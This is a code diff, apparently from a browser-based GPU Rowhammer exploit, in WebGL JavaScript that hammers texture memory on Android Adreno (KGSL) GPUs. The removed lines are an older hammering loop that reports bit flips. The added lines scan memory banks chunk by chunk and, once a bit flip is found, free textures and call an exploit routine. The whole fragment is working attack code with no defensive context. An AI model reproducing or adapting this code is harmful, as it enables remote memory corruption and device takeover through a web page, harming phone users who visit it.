+        console.log("Hammering chunk: " + chunk_i + "/" + (chunks_array.length-1) + "\t(Num of pages="+chunk.length+")")
+        sleep(10)
+
+        for (let index = 0; index < chunk.length - 33; index++) { 
+            let relative_chunk = chunk.slice(index, index + 34);
+            if(relative_chunk[0].kgsl_entry.bank != relative_chunk[1].kgsl_entry.bank ||
+                relative_chunk[0].kgsl_entry.bank >= 5){
+                    continue;
             }
-            console.log("Detected <" + kgslmap.length + "> contigious chunks...");
-            console.log("HAMMERING MATHAFAKA...");
-            for(var i = 0; i < kgslmap.length; ++i){
-                for(var k = 0; k < 28; ++k){
-                    gl.useProgram(prog);
-                    console.log("Hammering [" + i +" : " + k + "]");
-                    // HAMMERED ROW
-                    for(var j = 0 ; j < 4; ++j){
-                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID]);
-                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, texdata);
-                    }
-    
-                    // IDLE ROWS
-                    var evictionTexLocation = gl.getUniformLocation(prog, "row1");
-                    gl.uniform1i(evictionTexLocation, 0);
-                    gl.activeTexture(gl.TEXTURE0); // eviction Texture Unit
-                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k].tex_id - startID]);
-                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                    
-                    var evictionTexLocation2 = gl.getUniformLocation(prog, "row2");
-                    gl.uniform1i(evictionTexLocation, 1);
-                    gl.activeTexture(gl.TEXTURE0 + 1); // eviction Texture Unit
-                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 32].tex_id - startID]);
-                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                    
-                    for(var j = 0 ; j < 4; ++j){
-                        var evictLoc = gl.getUniformLocation(prog, "evict[" + j + "]");
-                        gl.uniform1i(evictionTexLocation, 0);
-                        gl.activeTexture(gl.TEXTURE0 + 2 + j); // eviction Texture Unit
-                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 1 + j].tex_id - startID]);
-                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                    }
-    
-                    for(var j = 0 ; j < 4; ++j){
-                        var evictLoc = gl.getUniformLocation(prog, "evict[" + 4 + j + "]");
-                        gl.uniform1i(evictionTexLocation, 0);
-                        gl.activeTexture(gl.TEXTURE0 + 6 + j); // eviction Texture Unit
-                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 33 + j].tex_id - startID]);
-                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
-                    }
-    
-                    var evictLoc = gl.getUniformLocation(prog, "evict[8]");
-                    gl.uniform1i(evictionTexLocation, 0);
-                    gl.activeTexture(gl.TEXTURE0 + 10); // eviction Texture Unit
-                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 5].tex_id - startID]);
-                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
             
-                    gl.clearColor(1, 0, 1, 1);
-                    gl.clear(gl.COLOR_BUFFER_BIT);
-                    console.log("RUNNING ...")
-                    gl.drawArrays(gl.TRIANGLES, 0, 3);
-                    console.log("EXECUTED ..")
-                    gl.bindFramebuffer(gl.FRAMEBUFFER, FBF);
-                    for(var j = 0 ; j < 4; ++j){
-                        // kgsl[kgslmap[i] + k + 16 + j].tex_id
-                        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID], 0);
-                        while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
-                            await sleep(10)
-                        }
-                        frame = new Uint8Array(32*32*4);
-                        gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
-                        for(var it = 0; it < 32 * 32 * 4; ++it)
-                            if(frame[it] != 0xff){
-                                
-                                console.log("BITFLIP FROM 0xff to 0x" + (frame[it]))
-                            }
-                    }
-                    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-                }
+            console.log(index + "/" + (chunk.length-1) + ") bank="+relative_chunk[0].kgsl_entry.bank)
+            sleep(10)
+            // await new_print(relative_chunk[16])
+            // await new_print(relative_chunk[17])
+            await prepare_texture_content_for_hammering(relative_chunk);
+            // await new_print(relative_chunk[16])
+            // await new_print(relative_chunk[17])
+            // return
+            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture_hammer_output, 0);
+            while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {await sleep(500)}
+            await hammer_chunk(shaderProgram, relative_chunk);
+            gl.finish();
+            let did_flip = false;
+            did_flip = await new_print_texture_and_check(relative_chunk[16])
+            // await new_print_texture_and_check(relative_chunk[17])
+
+            if(did_flip == true){ // is bit flip is in the right place
+                sleep(10)
+                await remove_2048textures(relative_chunk, chunks_array_not_filtered)
+                await exploit(relative_chunk)
+                console.log("Finished after finding bitflip")
+                return
             }
-        
-          
-            
-        })
-    
-    })
-	    
+            await sleep(10)
+        }
+    }
+
+
+    console.log("Finished")
+
+
 }
 
